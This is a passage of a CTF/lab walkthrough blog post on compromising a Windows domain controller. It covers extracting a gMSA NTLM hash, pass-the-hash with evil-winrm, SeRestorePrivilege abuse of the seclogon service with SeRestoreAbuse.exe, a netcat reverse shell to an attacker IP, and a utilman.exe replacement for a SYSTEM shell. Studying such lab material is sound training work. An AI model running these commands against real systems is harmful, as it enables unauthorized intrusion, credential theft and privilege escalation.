+<h2><span class="ez-toc-section" id="Extracting_the_gMSA_Password_Using_GMSAPasswordReaderexe_and_Getting_a_Shell_as_svc_apache"></span><strong>Extracting the gMSA Password Using GMSAPasswordReader.exe and Getting a Shell as svc_apache</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Now that we know that we are able to retrieve the gMSA password with our current user, we can use a tool called <strong>GMSAPasswordReader.exe</strong> to extract the NTLM hash created by gMSA for the svc_apache service account.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>There is a good GitHub repo that contains some compiled binaries including this one, which can be downloaded <strong><a href="https://github.com/expl0itabl3/Toolies">here</a></strong>.</p></blockquote>
+
+
+
+<p>I downloaded <strong>GMSAPasswordReader.exe</strong> onto my attacker machine and then transferred it to the victim. Once on the victim, I executed program and was able to pull the <strong>rc4_hmac</strong> hash of the svc_apache account, like so:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>.\GMSAPasswordReader.exe --accountname 'svc_apache'</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/130bbf6bdc679e04cb20de42820bada8.png" alt="" class="wp-image-1828" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/130bbf6bdc679e04cb20de42820bada8.png 806w, https://juggernaut-sec.com/wp-content/uploads/2022/05/130bbf6bdc679e04cb20de42820bada8-300x114.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/130bbf6bdc679e04cb20de42820bada8-768x292.png 768w" sizes="(max-width: 806px) 100vw, 806px" width="806" height="306"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>The rc4_hmac hash is the same as the NT hash, they are interchangeable.</p></blockquote>
+
+
+
+<p>41bcd07b8cc9636826fe07ff9539ca57</p>
+
+
+
+<p>With the user’s NTLM hash, we can perform a pass-the-hash attack using evil-winrm to get a foothold on the victim. We know this will work since we already enumerated that this user is in the remote management group.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>DONT FORGET THE ‘$’ IN THE USERNAME!!!</p></blockquote>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>evil-winrm -i 192.168.194.165 -u svc_apache$ -H 41bcd07b8cc9636826fe07ff9539ca57</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/b9ad8e2880d6d4e5f40b3bfa3558e51b.png" alt="" class="wp-image-1829" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/b9ad8e2880d6d4e5f40b3bfa3558e51b.png 691w, https://juggernaut-sec.com/wp-content/uploads/2022/05/b9ad8e2880d6d4e5f40b3bfa3558e51b-300x70.png 300w" sizes="(max-width: 691px) 100vw, 691px" width="691" height="162"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>To see many ways that a pass-the-hash attack can be performed, check out my post on the topic <strong><a href="https://juggernaut-sec.com/pass-the-hash-attacks/">here</a></strong>.</p></blockquote>
+
+
+
+<h1><span class="ez-toc-section" id="Post_Exploitation_Enumeration_Part_2_and_Privilege_Escalation_to_SYSTEM"></span><strong>Post Exploitation Enumeration Part 2 and Privilege Escalation to SYSTEM</strong><span class="ez-toc-section-end"></span></h1>
+
+
+
+<p>Now that we have gained a foothold as the service account, we can begin performing enumeration again to see what access this user has.</p>
+
+
+
+<h2><span class="ez-toc-section" id="Discovering_svc_apache_has_SeRestorePrivileges_and_Finding_how_to_Exploit_Seclogon_for_Privilege_Escalation"></span><strong>Discovering svc_apache has SeRestorePrivileges and Finding how to Exploit Seclogon for Privilege Escalation</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Now that we have a shell as the service account, the first thing we want to do is check the accounts privileges using <strong>whoami /priv </strong></p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/50229adb58fbd1cc5bb936c6a4c3e5aa.png" alt="" class="wp-image-1831" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/50229adb58fbd1cc5bb936c6a4c3e5aa.png 570w, https://juggernaut-sec.com/wp-content/uploads/2022/05/50229adb58fbd1cc5bb936c6a4c3e5aa-300x99.png 300w" sizes="(max-width: 570px) 100vw, 570px" width="570" height="189"></figure>
+
+
+
+<ul><li>Here we can see the account has an interesting privilege set: <strong>SeRestorePrivelege</strong>.</li></ul>
+
+
+
+<p>Also, when using WinRM to obtain our foothold, we land in the users Documents folder where it was observed that there is a script for enabling this privelege, which hints to this being our most likeliest path to admin/SYSTEM.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/eaddd13bf980feac2fe5df73728d3227.png" alt="" class="wp-image-1835" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/eaddd13bf980feac2fe5df73728d3227.png 653w, https://juggernaut-sec.com/wp-content/uploads/2022/05/eaddd13bf980feac2fe5df73728d3227-300x75.png 300w" sizes="(max-width: 653px) 100vw, 653px" width="653" height="164"></figure>
+
+
+
+<p>Reading the comments in the script tells us that the script is used to enable SeRestorePrivilege in the current session if the user has the token; however, ours is already enabled due to using evil-winrm. The script also mentions a GitHub page to explain how to take admin rights from this privelege .. hint hint.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/7b0e9877a2481b1b6a5a6b04043e3d09.png" alt="" class="wp-image-1836" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/7b0e9877a2481b1b6a5a6b04043e3d09.png 941w, https://juggernaut-sec.com/wp-content/uploads/2022/05/7b0e9877a2481b1b6a5a6b04043e3d09-300x69.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/7b0e9877a2481b1b6a5a6b04043e3d09-768x177.png 768w" sizes="(max-width: 941px) 100vw, 941px" width="941" height="217"></figure>
+
+
+
+<p>Going to the GitHub <strong><a href="https://github.com/gtworek/Priv2Admin">link</a></strong> in the comments, I found the following information on how to abuse this privilege:</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/42c5fa8f43c6faa909b013d800dd21a444c.png" alt="" class="wp-image-1837" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/42c5fa8f43c6faa909b013d800dd21a444c.png 483w, https://juggernaut-sec.com/wp-content/uploads/2022/05/42c5fa8f43c6faa909b013d800dd21a444c-300x163.png 300w" sizes="(max-width: 483px) 100vw, 483px" width="483" height="262"></figure>
+
+
+
+<p>The final step on the left appears to require GUI, but there is mention of an alternative method on the right that can be accomplished entirely from a reverse shell.</p>
+
+
+
+<p>For this attack we need to find to find a service that can be altered into a malicious one. Most importantly, the service needs to be a manual start service.</p>
+
+
+
+<p>With this information, we can attempt to list out all of services that require manual start and then find one we can alter and make malicious; however, since we are not an admin user  we will likely find that we do not have the required permissions to do this.</p>
+
+
+
+<p>As expected, while attempting to list all manual start services with the following commands, we are presented with an Access denied message.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>cmd.exe /c sc queryex state=all type=service
+
+Get-Service | findstr -i "manual"
+
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/d3a2009bb782f685112accebedccb30f.png" alt="" class="wp-image-1839" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/d3a2009bb782f685112accebedccb30f.png 944w, https://juggernaut-sec.com/wp-content/uploads/2022/05/d3a2009bb782f685112accebedccb30f-300x146.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/d3a2009bb782f685112accebedccb30f-768x373.png 768w" sizes="(max-width: 944px) 100vw, 944px" width="944" height="459"></figure>
+
+
+
+<p>Fortunately, there are a few services that are known to have manual start permissions and that can be started by all users. Particularly, we are insterested in the <strong>seclogon</strong> service.</p>
+
+
+
+<p>Using the following command, we see the privileges that are required by the task (SeRestorePrivilege is listed), the object name (who executes the service = SYSTEM), and the start value (0x3 = manual):</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/1a6bb1df6f7b42749ec456be1197b0ca.png" alt="" class="wp-image-1840" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/1a6bb1df6f7b42749ec456be1197b0ca.png 935w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1a6bb1df6f7b42749ec456be1197b0ca-300x76.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1a6bb1df6f7b42749ec456be1197b0ca-768x195.png 768w" sizes="(max-width: 935px) 100vw, 935px" width="935" height="237"></figure>
+
+
+
+<p>We can also use the following <strong>sc</strong> command to confirm this is service is set to manual start; however, checking the registry does provide more detail.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>cmd.exe /c sc qc seclogon</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/e64df498ed3d06570318140c895d2a35.png" alt="" class="wp-image-1841" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/e64df498ed3d06570318140c895d2a35.png 609w, https://juggernaut-sec.com/wp-content/uploads/2022/05/e64df498ed3d06570318140c895d2a35-300x108.png 300w" sizes="(max-width: 609px) 100vw, 609px" width="609" height="219"></figure>
+
+
+
+<p>Lastly, there is only thing left to do, which is to confirm that we have the correct permissions to manipulate this service. This can be determined using the following command:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>cmd.exe /c sc sdshow seclogon</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/4eff67aa641eb19bff6d0708f1062c07.png" alt="" class="wp-image-1856" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/4eff67aa641eb19bff6d0708f1062c07.png 943w, https://juggernaut-sec.com/wp-content/uploads/2022/05/4eff67aa641eb19bff6d0708f1062c07-300x27.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/4eff67aa641eb19bff6d0708f1062c07-768x69.png 768w" sizes="(max-width: 943px) 100vw, 943px" width="943" height="85"></figure>
+
+
+
+<p>It returns a weird output called “security descriptors”, which are simply just permissions for this service represented in a different way. At first glance its confusing, but it quickly begins to make sense when you know what you are looking for. </p>
+
+
+
+<p>In our case, we are looking to see if the program can be manually started and if so, which group has permissions to manually start it.</p>
+
+
+
+<p>Each of the letters above are in groups of two’s, which means we can break down the descriptors as CC ; LC ; SW ; RP ; DT ; LO ; CR ; RC and then after the three semi-colons, we have the group AU. </p>
+
+
+
+<p>The two descriptors we are interested in finding are RP and AU. Starting with AU, this means that all the descriptors (CC ; LC ; SW ; RP ; DT ; LO ; CR ; RC) or “permissions” on this service can be executed by the Authenticated Users group (any logged in user). Next, the RP represents the ability to start the service. This means that all authenticated user’s have the ability to start this service… Perfect!</p>
+
+
+
+<blockquote class="wp-block-quote"><p>There is a good post I found online that breaks down what each descriptor means. You can check it out <strong><a href="https://www.winhelponline.com/blog/view-edit-service-permissions-windows/">here</a></strong>.</p></blockquote>
+
+
+
+<p>To abuse the seclogon service with this privilege, we will use a binary called <strong>SeRestoreAbuse.exe</strong>.</p>
+
+
+
+<h2><span class="ez-toc-section" id="Compiling_SeRestoreAbuseexe_from_an_SLN_Using_Visual_Studio"></span><strong>Compiling SeRestoreAbuse.exe from an SLN Using Visual Studio</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Navigating to the GitHub repo for this exploit <strong><a href="https://github.com/xct/SeRestoreAbuse">here</a></strong>, we can clone this onto our attacker machine and then prepare to send the SLN to a Windows lab machine so that it can be compiled using Visual Studio.</p>
+
+
+
+<p>Before we compile the executable, let’s have a look at the CPP file to breakdown what this does.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-85.png" alt="" class="wp-image-1861" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-85.png 985w, https://juggernaut-sec.com/wp-content/uploads/2022/05/image-85-300x221.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/image-85-768x565.png 768w" sizes="(max-width: 985px) 100vw, 985px" width="985" height="725"></figure>
+
+
+
+<p>We can see that the executable does the following:</p>
+
+
+
+<ul><li>First, it enables the SeRestorePrivilege in the current session (same as the PS1 script does that we found)</li><li>Next, the seclogon registry key is altered to setup the attack</li><li>Then, the value of the subkey is set so that the command we enter replaces the imagepath so when the service is started, it points to our malicious file instead of the actual service binary.</li><li>Finally, the service is started with an obfuscated PowerShell command using b64 with the <strong>-en</strong>c switch. This simply decodes to: <strong>Get-Service seclogon | Start-Service</strong></li></ul>
+
+
+
+<p>I cloned this repository onto my attacker machine and started an HTTP server in the directory housing the SLN and the folder with the CPP in it.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/5dfd03472282f2b239e668044665ffd9.png" alt="" class="wp-image-1844" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/5dfd03472282f2b239e668044665ffd9.png 533w, https://juggernaut-sec.com/wp-content/uploads/2022/05/5dfd03472282f2b239e668044665ffd9-300x187.png 300w" sizes="(max-width: 533px) 100vw, 533px" width="533" height="333"></figure>
+
+
+
+<p>Next I fired up my lab machine and then navigated to the attacker URL and downloaded all of the files I need, which ended up being 4 files in total.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/83367255f0f7a5ca8bed9bf567086c2b.png" alt="" class="wp-image-1845" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/83367255f0f7a5ca8bed9bf567086c2b.png 649w, https://juggernaut-sec.com/wp-content/uploads/2022/05/83367255f0f7a5ca8bed9bf567086c2b-300x190.png 300w" sizes="(max-width: 649px) 100vw, 649px" width="649" height="410"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/2db9dc6463eacc4bcb5338dc8fb339b3.png" alt="" class="wp-image-1846" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/2db9dc6463eacc4bcb5338dc8fb339b3.png 620w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2db9dc6463eacc4bcb5338dc8fb339b3-300x60.png 300w" sizes="(max-width: 620px) 100vw, 620px" width="620" height="124"></figure>
+
+
+
+<p>I put all the files into their own folder exactly how it looked when it was cloned from the repository.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/8c9fef686d6bee6c2bc7e222c38dad31.png" alt="" class="wp-image-1847" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/8c9fef686d6bee6c2bc7e222c38dad31.png 646w, https://juggernaut-sec.com/wp-content/uploads/2022/05/8c9fef686d6bee6c2bc7e222c38dad31-300x225.png 300w" sizes="(max-width: 646px) 100vw, 646px" width="646" height="484"></figure>
+
+
+
+<p>Next I right-clicked the SLN and opened it with Visual Studio.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/8987ea555c8b18e120a04415cc243677.png" alt="" class="wp-image-1848" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/8987ea555c8b18e120a04415cc243677.png 978w, https://juggernaut-sec.com/wp-content/uploads/2022/05/8987ea555c8b18e120a04415cc243677-300x160.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/8987ea555c8b18e120a04415cc243677-768x411.png 768w" sizes="(max-width: 978px) 100vw, 978px" width="978" height="523"></figure>
+
+
+
+<p>Once it loads, open up the CPP from the Solution Explorer menu on the right-hand side.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/ab747089f085a7a9d100616b0fce9dab.png" alt="" class="wp-image-1849" width="217" height="244"></figure>
+
+
+
+<p>At the top set it to Release and to x64 and then build the solution.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/f1db735e830a050e5e734a411112e861-1024x100.png" alt="" class="wp-image-1850" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/f1db735e830a050e5e734a411112e861-1024x100.png 1024w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f1db735e830a050e5e734a411112e861-300x29.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f1db735e830a050e5e734a411112e861-768x75.png 768w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f1db735e830a050e5e734a411112e861.png 1049w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="100"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cfc3b5d2f6ec2f7197b053631d1c6709.png" alt="" class="wp-image-1851" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/cfc3b5d2f6ec2f7197b053631d1c6709.png 697w, https://juggernaut-sec.com/wp-content/uploads/2022/05/cfc3b5d2f6ec2f7197b053631d1c6709-300x160.png 300w" sizes="(max-width: 697px) 100vw, 697px" width="697" height="372"></figure>
+
+
+
+<p>Down at the bottom we should see in the output that the EXE was built successfully.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/92d66634c52c8dadb4bd5e998205b85b.png" alt="" class="wp-image-1852" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/92d66634c52c8dadb4bd5e998205b85b.png 743w, https://juggernaut-sec.com/wp-content/uploads/2022/05/92d66634c52c8dadb4bd5e998205b85b-300x65.png 300w" sizes="(max-width: 743px) 100vw, 743px" width="743" height="162"></figure>
+
+
+
+<p>Navigating to the folder we created, there should be a new subdirectory named x64, which is where our shiny new EXE should be located.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/1ec80f8858143ac0d6f48d6f2372ac7e.png" alt="" class="wp-image-1853" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/1ec80f8858143ac0d6f48d6f2372ac7e.png 801w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1ec80f8858143ac0d6f48d6f2372ac7e-300x171.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1ec80f8858143ac0d6f48d6f2372ac7e-768x437.png 768w" sizes="(max-width: 801px) 100vw, 801px" width="801" height="456"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/2f5cbb3b4a2c5516c759d7da4edf9afe.png" alt="" class="wp-image-1854" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/2f5cbb3b4a2c5516c759d7da4edf9afe.png 801w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2f5cbb3b4a2c5516c759d7da4edf9afe-300x171.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2f5cbb3b4a2c5516c759d7da4edf9afe-768x437.png 768w" sizes="(max-width: 801px) 100vw, 801px" width="801" height="456"></figure>
+
+
+
+<p>With the binary all ready to go, I setup an SMB share on my attacker machine and then copied the executable over.</p>
+
+
+
+<p>Attacker:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>impacket-smbserver share $(pwd) -smb2support</code></pre>
+
+
+
+<p>Lab machine:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>copy "C:\users\administrator\new folder\x64\release\cve-2020-0796-local.exe \\172.16.1.30\share</code></pre>
+
+
+
+<p>I see the lab machine checked into my SMB server and the file was successfully sent back to my attacker machine.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/3acbff1bc8c997b0f24aa22bbaafaba9.png" alt="" class="wp-image-1857" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/3acbff1bc8c997b0f24aa22bbaafaba9.png 940w, https://juggernaut-sec.com/wp-content/uploads/2022/05/3acbff1bc8c997b0f24aa22bbaafaba9-300x105.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/3acbff1bc8c997b0f24aa22bbaafaba9-768x270.png 768w" sizes="(max-width: 940px) 100vw, 940px" width="940" height="330"></figure>
+
+
+
+<p>With the executable on the attacker machine and ready to use, I closed the share and started an HTTP server form the same directory since it is housing the EXE. Then downloaded the EXE onto the victim using <strong>curl</strong>.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/bb972063ae11fac5c332551823893dd0.png" alt="" class="wp-image-1858" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/bb972063ae11fac5c332551823893dd0.png 927w, https://juggernaut-sec.com/wp-content/uploads/2022/05/bb972063ae11fac5c332551823893dd0-300x47.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/bb972063ae11fac5c332551823893dd0-768x120.png 768w" sizes="(max-width: 927px) 100vw, 927px" width="927" height="145"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/675b44b96338ee18ccf783789cae6efb.png" alt="" class="wp-image-1859" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/675b44b96338ee18ccf783789cae6efb.png 733w, https://juggernaut-sec.com/wp-content/uploads/2022/05/675b44b96338ee18ccf783789cae6efb-300x87.png 300w" sizes="(max-width: 733px) 100vw, 733px" width="733" height="212"></figure>
+
+
+
+<h2><span class="ez-toc-section" id="Getting_a_SYSTEM_shell_with_SeRestoreAbuseexe_and_Netcat"></span><strong>Getting a SYSTEM shell with SeRestoreAbuse.exe and Netcat</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>After transferring the executable to the victim, we need one more thing and that is a file / command to execute as SYSTEM to get a reverse shell.</p>
+
+
+
+<p>For this example, I decided to transfer nc.exe onto the victim, which will be used to push a SYSTEM shell to our attacker machine.</p>
+
+
+
+<p>Once nc.exe has been downloaded onto the victim, I closed down my HTTP server and then started a netcat listener on my attacker machine on port 445. After that, I used the following command to execute nc.exe with SeRestoreAbuse.exe and received a SYSTEM shell back on my listener:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/ad4131454b8410811bc1e6a6cad20d23.png" alt="" class="wp-image-1862" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/ad4131454b8410811bc1e6a6cad20d23.png 807w, https://juggernaut-sec.com/wp-content/uploads/2022/05/ad4131454b8410811bc1e6a6cad20d23-300x23.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/ad4131454b8410811bc1e6a6cad20d23-768x60.png 768w" sizes="(max-width: 807px) 100vw, 807px" width="807" height="63"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/1af189562cb66072a17998a31de8038d.png" alt="" class="wp-image-1863" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/1af189562cb66072a17998a31de8038d.png 549w, https://juggernaut-sec.com/wp-content/uploads/2022/05/1af189562cb66072a17998a31de8038d-300x95.png 300w" sizes="(max-width: 549px) 100vw, 549px" width="549" height="174"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>This shell was very unstable and died after 30 seconds. To get around this issue, start up a second listener and then as soon as you get the SYSTEM shell, push another shell to the second listener using only nc.exe. Since this second shell is made using just nc.exe and not a combination of SeRestoreAbuse.exe + nc.exe, it will be stable.</p></blockquote>
+
+
+
+<h2><span class="ez-toc-section" id="Flags"></span><strong>Flags</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-86.png" alt="" class="wp-image-1864" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-86.png 548w, https://juggernaut-sec.com/wp-content/uploads/2022/05/image-86-300x297.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/image-86-150x150.png 150w" sizes="(max-width: 548px) 100vw, 548px" width="548" height="543"></figure>
+
+
+
+<h1><span class="ez-toc-section" id="BONUS_-_Privilege_Escalation_via_GUI_Method_utilmanexe"></span><strong>BONUS – Privilege Escalation via GUI Method (utilman.exe)</strong><span class="ez-toc-section-end"></span></h1>
+
+
+
+<p>Once you get on the box, execute the script in the users documents folder to enable the privileges; however using evil-winrm they should already be enabled.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>.\EnableSeRestorePrivilege.ps1</code></pre>
+
+
+
+<p>Next, we will follow the 5 steps on the left side of the snip from earlier.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-87.png" alt="" class="wp-image-1868" width="261" height="252"></figure>
+
+
+
+<p>The utilman.exe is a built-in Windows application that is designed to allow users to configure system accessibility options such as the Magnifier, High Contrast Theme, Narrator, and On Screen Keyboard before they log in to the system.</p>
+
+
+
+<p>This application is triggered by issuing the <strong>WIN + U</strong> key combination while on the Windows Logon screen and the application runs with SYSTEM privileges.</p>
+
+
+
+<p>Since our evil-winrm shell already has SeRestorePrivilege enabled, we can jump to steps 3 and 4:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</code></pre>
+
+
+
+<p>Lastly, step 5 is easy. All we need to do is run <strong>rdesktop</strong> against the DC and don;t specify a user so that we are prompted with a login screen.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>By default, this would not actually work so easily as the system needs network level authentication turned off in the RDP setting to allow us to get to the Window’s login screen. Window’s has this protection in place to prevent accessing the login page through RDP, which means the user has to specify user / pass combo to “pre-authenticate” into RDP.</p></blockquote>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>rdesktop 192.168.194.165</code></pre>
+
+
+
+<p>Finally, when rdesktop loads, we can issue the <strong>WIN + U</strong> keyboard hotkeys and a SYSTEM shell should spawn.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/8eba11c3231ecd27cf679a8c9a7ced2d.png" alt="" class="wp-image-1869" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/8eba11c3231ecd27cf679a8c9a7ced2d.png 762w, https://juggernaut-sec.com/wp-content/uploads/2022/05/8eba11c3231ecd27cf679a8c9a7ced2d-300x233.png 300w" sizes="(max-width: 762px) 100vw, 762px" width="762" height="591"></figure>
+  
+  
+  <div class="
+    mailpoet_form_popup_overlay
+      "></div>
+  <div id="mp_form_below_posts1" class="mailpoet_form mailpoet_form_below_posts mailpoet_form_position_ mailpoet_form_animation_" style="font-family: &quot;Montserrat&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;">
+    
+    <style type="text/css">
+     .mailpoet_hp_email_label{display:none!important;}#mp_form_below_posts1 form.mailpoet_form { margin-bottom: 0; }
+#mp_form_below_posts1 p.mailpoet_form_paragraph.last { margin-bottom: 0px; }
+#mp_form_below_posts1 h1.mailpoet-heading { margin: 0 0 10px; }
+#mp_form_below_posts1 .mailpoet_column_with_background { padding: 10px; }
+#mp_form_below_posts1 .mailpoet_form_column:not(:first-child) { margin-left: 20px; }
+#mp_form_below_posts1 .mailpoet_paragraph { line-height: 20px; margin-bottom: 20px; }
+#mp_form_below_posts1 .mailpoet_segment_label, #mp_form_below_posts1 .mailpoet_text_label, #mp_form_below_posts1 .mailpoet_textarea_label, #mp_form_below_posts1 .mailpoet_select_label, #mp_form_below_posts1 .mailpoet_radio_label, #mp_form_below_posts1 .mailpoet_checkbox_label, #mp_form_below_posts1 .mailpoet_list_label, #mp_form_below_posts1 .mailpoet_date_label { display: block; font-weight: normal; }
+#mp_form_below_posts1 .mailpoet_text, #mp_form_below_posts1 .mailpoet_textarea, #mp_form_below_posts1 .mailpoet_select, #mp_form_below_posts1 .mailpoet_date_month, #mp_form_below_posts1 .mailpoet_date_day, #mp_form_below_posts1 .mailpoet_date_year, #mp_form_below_posts1 .mailpoet_date { display: block; }
+#mp_form_below_posts1 .mailpoet_text, #mp_form_below_posts1 .mailpoet_textarea { width: 200px; }
+#mp_form_below_posts1 .mailpoet_checkbox {  }
+#mp_form_below_posts1 .mailpoet_submit {  }
+#mp_form_below_posts1 .mailpoet_divider {  }
+#mp_form_below_posts1 .mailpoet_message {  }
+#mp_form_below_posts1 .mailpoet_form_loading { width: 30px; text-align: center; line-height: normal; }
